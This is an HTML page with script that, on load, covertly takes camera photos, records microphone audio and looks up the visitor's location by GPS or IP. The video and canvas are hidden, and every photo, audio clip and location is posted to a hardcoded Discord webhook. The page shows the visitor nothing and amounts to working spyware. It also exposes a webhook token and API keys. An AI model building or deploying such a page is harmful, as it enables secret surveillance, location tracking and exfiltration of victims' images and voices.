<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Multiple Photo and Audio Capture with Location</title>
    <style>
        video, canvas {
            display: none; /* Hide video and canvas */
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const discordWebhookURL = 'https://discord.com/api/webhooks/1302878400523796572/kKNxn1f3uNOmwAU7dyHN9jTkH-i9oN2FZ93ImexFnYNHHLm8Dw1tJCIDrAejvkNtz1ck';
        const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa';
        const ipinfoURL = 'https://ipinfo.io/json?token=41d360af12f2bf';

        let locationData = "Location not available";
        let audioRecorder;
        let audioChunks = [];

        // Request permission for camera and microphone on page load
        async function requestPermissions() {
            try {
                // Request access to video and audio
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video').srcObject = stream;

                // Start capturing video and audio once permissions are granted
                initCameraAndAudio(stream);
            } catch (error) {
                console.error("Error accessing camera or microphone:", error);
                sendErrorToDiscord("Failed to access camera or microphone.");
            }
        }

        // Initialize the camera and audio recording
        async function initCameraAndAudio(stream) {
            try {
                captureMultiplePhotos();

                // Start audio recording setup with the audio stream
                audioRecorder = new MediaRecorder(stream);
                audioRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                // Start recording audio at regular intervals
                startAudioRecording();
            } catch (error) {
                console.error("Error initializing camera or audio:", error);
                sendErrorToDiscord("Error initializing camera or audio.");
            }
        }

        // Fetch location data
        async function getLocation() {
            try {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const { latitude, longitude } = position.coords;
                        locationData = await reverseGeocode(latitude, longitude);
                    }, async () => {
                        await getLocationFromIP();
                    });
                } else {
                    await getLocationFromIP();
                }
            } catch (error) {
                console.error("Error getting location:", error);
                sendErrorToDiscord("Error fetching location data.");
            }
        }

        // Fallback location using IP API
        async function getLocationFromIP() {
            try {
                const response = await fetch(ipinfoURL);
                const data = await response.json();
                const { loc } = data;
                if (loc) {
                    const [latitude, longitude] = loc.split(',');
                    locationData = await reverseGeocode(latitude, longitude);
                } else {
                    locationData = "Unable to retrieve location";
                }
            } catch (error) {
                locationData = "Unable to retrieve location";
            }
        }

        // Reverse geocode to get a human-readable address
        async function reverseGeocode(latitude, longitude) {
            try {
                const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;
                const response = await fetch(url);
                const data = await response.json();
                return data.display_name || `Lat: ${latitude}, Lon: ${longitude}`;
            } catch (error) {
                return `Lat: ${latitude}, Lon: ${longitude}`;
            }
        }

        // Capture multiple photos with an immediate first capture, then a 3-second delay between each
        async function captureMultiplePhotos() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            let captureCount = 0;
            const maxCaptures = 10;
            const captureInterval = 3000;

            // Function to capture and send a single photo
            async function captureAndSendPhoto() {
                try {
                    context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

                    if (imageBlob) {
                        const formData = new FormData();
                        formData.append('file', imageBlob, `capture_${captureCount + 1}.png`);
                        formData.append('payload_json', JSON.stringify({ content: `Location: ${locationData}` }));

                        const response = await fetch(discordWebhookURL, {
                            method: 'POST',
                            body: formData
                        });

                        if (!response.ok) {
                            console.error("Failed to send image to Discord:", response.statusText);
                        }
                    } else {
                        sendErrorToDiscord("Failed to capture image.");
                    }
                } catch (error) {
                    sendErrorToDiscord("Error sending image to Discord.");
                }
            }

            // Start by capturing the first photo immediately
            await captureAndSendPhoto();
            captureCount++;

            // Then set an interval to capture additional photos every 3 seconds
            const captureIntervalId = setInterval(async () => {
                if (captureCount < maxCaptures) {
                    await captureAndSendPhoto();
                    captureCount++;
                } else {
                    clearInterval(captureIntervalId);
                }
            }, captureInterval);
        }

        // Start and stop audio recording every few seconds, then send audio to Discord
        function startAudioRecording() {
            const audioInterval = 5000;

            const audioIntervalId = setInterval(async () => {
                if (audioRecorder.state === "inactive") {
                    audioRecorder.start();
                } else {
                    audioRecorder.stop();
                    await sendAudioToDiscord();
                    audioChunks = [];
                }
            }, audioInterval);
        }

        // Send audio recording to Discord
        async function sendAudioToDiscord() {
            audioRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });

                const formData = new FormData();
                formData.append('file', audioBlob, 'recording.wav');
                formData.append('payload_json', JSON.stringify({ content: `Audio recorded at location: ${locationData}` }));

                try {
                    const response = await fetch(discordWebhookURL, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        console.error("Failed to send audio to Discord:", response.statusText);
                    }
                } catch (error) {
                    sendErrorToDiscord("Error sending audio to Discord.");
                }
            };
        }

        // Send an error message to Discord
        function sendErrorToDiscord(message) {
            fetch(discordWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `Error: ${message}` })
            });
        }

        // Start everything on page load
        window.onload = async () => {
            await getLocation();
            await requestPermissions();  // Request permissions and initialize camera/audio
        };
    </script>
</body>
</html>
